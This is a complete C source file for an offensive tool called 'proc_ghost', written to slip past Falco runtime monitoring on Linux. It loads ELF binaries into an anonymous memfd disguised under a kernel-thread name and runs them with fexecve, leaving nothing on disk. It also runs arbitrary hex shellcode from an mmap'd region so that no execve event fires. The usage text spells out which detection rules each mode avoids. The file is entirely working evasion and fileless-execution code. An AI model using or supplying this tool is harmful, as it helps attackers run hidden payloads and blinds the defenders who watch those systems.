#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/sendfile.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

static int memfd_create_name(const char *name, unsigned int flags)
{
    return (int)syscall(SYS_memfd_create, name, flags);
}

static int elf_to_memfd(const char *src_path, const char *memfd_name)
{
    int src = open(src_path, O_RDONLY);
    if (src < 0) { perror(src_path); return -1; }

    struct stat st;
    if (fstat(src, &st) < 0) { perror("fstat"); close(src); return -1; }

    int mfd = memfd_create_name(memfd_name, MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); close(src); return -1; }

    if (ftruncate(mfd, st.st_size) < 0) {
        perror("ftruncate"); close(src); close(mfd); return -1;
    }

    off_t off = 0;
    ssize_t rem = st.st_size;
    while (rem > 0) {
        ssize_t n = sendfile(mfd, src, &off, (size_t)rem);
        if (n <= 0) {
            if (n < 0 && errno == EINTR) continue;

            char buf[65536];
            lseek(src, off, SEEK_SET);
            while (rem > 0) {
                ssize_t r = read(src, buf, sizeof(buf) < (size_t)rem ? sizeof(buf) : (size_t)rem);
                if (r <= 0) break;
                write(mfd, buf, (size_t)r);
                rem -= r;
            }
            break;
        }
        rem -= n;
    }

    close(src);
    return mfd;
}

static void cmd_ghost_elf(const char *elf_path, char *const argv[], char *const envp[])
{
    fprintf(stderr, "[*] proc_ghost: loading '%s' into anonymous memfd\n", elf_path);

    int mfd = elf_to_memfd(elf_path, "kworker/u:0");
    if (mfd < 0) return;

    char fdpath[64], linkdst[256];
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", mfd);
    ssize_t n = readlink(fdpath, linkdst, sizeof(linkdst) - 1);
    if (n > 0) { linkdst[n] = '\0'; fprintf(stderr, "[*] memfd path: %s\n", linkdst); }

    fprintf(stderr,
        "[*] fexecve from memfd - after exec:\n"
        "    /proc/<pid>/exe → 'memfd:kworker/u:0 (deleted)'\n"
        "    proc.exepath in Falco = '/memfd:kworker/u:0 (deleted)'\n"
        "    sched_process_exec WILL fire (unavoidable)\n"
        "    but proc.exepath-based rules ('starts with /tmp') don't match\n"
        "    and the binary does NOT exist on disk\n");

    extern char **environ;
    char *const *use_env = envp ? envp : environ;
    fexecve(mfd, argv, use_env);
    perror("fexecve");
    close(mfd);
}

static void cmd_ghost_sc(const char *hexsc)
{

    size_t hexlen = strlen(hexsc);
    if (hexlen % 2 != 0) { fprintf(stderr, "[-] odd hex length\n"); return; }
    size_t sc_len = hexlen / 2;

    uint8_t *sc = malloc(sc_len);
    if (!sc) { perror("malloc"); return; }
    for (size_t i = 0; i < sc_len; i++) {
        unsigned byte;
        sscanf(hexsc + i * 2, "%02x", &byte);
        sc[i] = (uint8_t)byte;
    }

    long page = sysconf(_SC_PAGESIZE);
    size_t map_sz = (sc_len + (size_t)page - 1) & ~((size_t)page - 1);

    void *mem = mmap(NULL, map_sz, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); free(sc); return; }

    memcpy(mem, sc, sc_len);
    free(sc);

    if (mprotect(mem, map_sz, PROT_READ|PROT_EXEC) < 0) {
        perror("mprotect"); munmap(mem, map_sz); return;
    }

    fprintf(stderr,
        "[*] shellcode @ %p (%zu bytes)\n"
        "[*] executing via function pointer - no execve, no sched_process_exec\n"
        "[*] /proc/self/maps shows anonymous region (no path in Falco's fd.name)\n",
        mem, sc_len);
    fflush(stderr);

    __builtin___clear_cache(mem, (char *)mem + sc_len);
    ((void (*)(void))mem)();

    munmap(mem, map_sz);
}

static void cmd_ghost_self(void)
{

    char self_path[256] = {};
    ssize_t n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (n <= 0) { perror("readlink /proc/self/exe"); return; }
    self_path[n] = '\0';
    fprintf(stderr, "[*] self exe: %s → copying into memfd\n", self_path);

    int mfd = elf_to_memfd(self_path, "kworker/u:0");
    if (mfd < 0) return;

    char mfd_path[64];
    snprintf(mfd_path, sizeof(mfd_path), "/proc/self/fd/%d", mfd);

    char *argv[] = { mfd_path, "--ghost-check", NULL };
    extern char **environ;
    fexecve(mfd, argv, environ);
    perror("fexecve");
}

int main(int argc, char *argv[])
{

    if (argc >= 2 && strcmp(argv[1], "--ghost-check") == 0) {
        char exe[256] = {};
        ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (n > 0) exe[n] = '\0';
        printf("[+] proc_ghost_self: running from memfd!\n");
        printf("    /proc/self/exe → %s\n", exe);
        printf("    this binary does not exist on disk\n");
        printf("    Falco sees proc.exepath = '%s'\n", exe);
        return 0;
    }

    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s ghost-elf  <elf>  [args...]  load ELF into memfd + fexecve\n"
            "  %s ghost-sc   <hex-shellcode>   mmap+mprotect exec, no execve\n"
            "  %s ghost-self                   re-exec this binary from memfd (demo)\n"
            "\nFalco impact:\n"
            "  ghost-elf:  sched_process_exec fires, BUT:\n"
            "              proc.exepath = 'memfd:<name> (deleted)' - no on-disk match\n"
            "              combine with rule_evade name-spoof to control proc.name\n"
            "  ghost-sc:   sched_process_exec does NOT fire (no execve)\n"
            "              completely invisible to Falco's exec rules\n"
            "\nrequires: nothing for ghost-sc; ghost-elf needs kernel 3.17+\n",
            argv[0], argv[0], argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "ghost-elf") == 0 && argc >= 3) {

        char *child_argv[128];
        int na = 0;
        child_argv[na++] = argv[2];
        for (int i = 3; i < argc && na < 127; i++)
            child_argv[na++] = argv[i];
        child_argv[na] = NULL;
        cmd_ghost_elf(argv[2], child_argv, NULL);
    }
    else if (strcmp(argv[1], "ghost-sc") == 0 && argc >= 3) {
        cmd_ghost_sc(argv[2]);
    }
    else if (strcmp(argv[1], "ghost-self") == 0) {
        cmd_ghost_self();
    }
    else {
        fprintf(stderr, "unknown: %s\n", argv[1]);
        return 1;
    }
    return 0;
}
